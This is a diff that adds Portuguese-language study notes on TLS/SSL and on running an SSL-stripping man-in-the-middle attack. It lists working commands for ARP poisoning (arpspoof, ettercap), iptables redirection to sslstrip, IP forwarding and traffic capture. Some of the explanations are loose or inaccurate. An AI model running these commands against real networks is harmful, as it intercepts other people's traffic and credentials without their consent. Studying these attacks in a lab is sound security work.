@@ -1,0 +1,59 @@
+Protocolos:
+- TLS: Transport Layer Security é um protocolo de segurança
+de rede usado para criptografar e transmitir dados HTTP e IPP
+(Internet Printing Protocol) por rede TCP/IP (Baseado nos SSLs anteriores)
+- SSL: Secure Sockets Layer(carrega pagina mais devagar), fornece segurança para email(SMTP),
+ HTTPS, e outros tipos de transferencias de dados.
+
+Deixando de aplicar o SSL e começando a usar o TSL.
+
+
+Foram criados para mitigar ataques man in the middle.
+Quebrar esses tipos de protocolo é impossivel hoje, mas da pra obter a informação de outra forma.
+TLS/SSL - Comunicação web.
+
+TCP -> TLS -> HTTP
+
+SSL striping - Quebrar a comunicação entre duas maquinas, e funciona juntamente com o arpspoofing.
+ 
+Comandos:
+
+- ifconfig
+- service ssh start
+- iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+# nat: Comunicação com a parte interna e externa da rede
+#POSTROUTING: pega o pacote e analisa e encaminha
+#PREROUTING: Não passa pelo processamento, ele só pega o pacote e encaminha
+#-p tcp: protocolo
+#--destination-port 80 : porta de destino original
+#-j REDIRECT --to-port 10000: redirecionado para a porta 10000
+
+-iptables -t nat -L
+- sslstrip -h 
+- sslstrip -w capture.txt
+Flip your machine into forwarding mode (as root):
+	   echo "1" > /proc/sys/net/ipv4/ip_forward
+
+-ettercap -G (Para iniciar a ettercap)
+Ver lista de host no ettercap
+Seleciona ARP Poisoning:
+- Sniff remote connections
+
+
+Outros metodos:
+
+Comandos:
+Trafego de saida:
+- arpspoof -i eth0 -t 192.168.0.1 192.168.0.12
+Trafego de entrada:
+- arpspoof -i eth0 -t 192.168.0.12 192.168.0.1
+# 192.168.0.1 : target roteador
+# 192.168.0.12 : alvo(vitima)
+
+SSLStrip, ataque man in the middle com sites com SSL/TLS
+- Utiliza por padrão a porta 10.000
+
+Diferença entre ethercap e Arpspoof.
+- Um mostra os dados e o outro não
+
+Abrir Burpsuite e explorar
